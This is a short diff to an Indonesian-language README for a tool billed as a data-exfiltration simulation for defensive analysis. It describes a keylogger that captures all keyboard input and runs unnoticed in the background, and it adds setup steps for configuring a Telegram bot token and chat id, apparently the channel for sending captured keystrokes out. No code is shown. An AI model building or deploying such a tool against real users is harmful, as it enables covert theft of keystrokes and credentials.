@@ -23,3 +23,6 @@ Simulasi metode data exfiltration untuk tujuan defensive analysis
 1.Mendeteksi segala inpu keyboard
 2.Dapat berjalan dilatar belakang tanpa disadari
 
+### Cara menggunakannya
+download script atau clone
+ubah .env_example menjadi .env lalu isi API Bot telegram anda dan id chat 
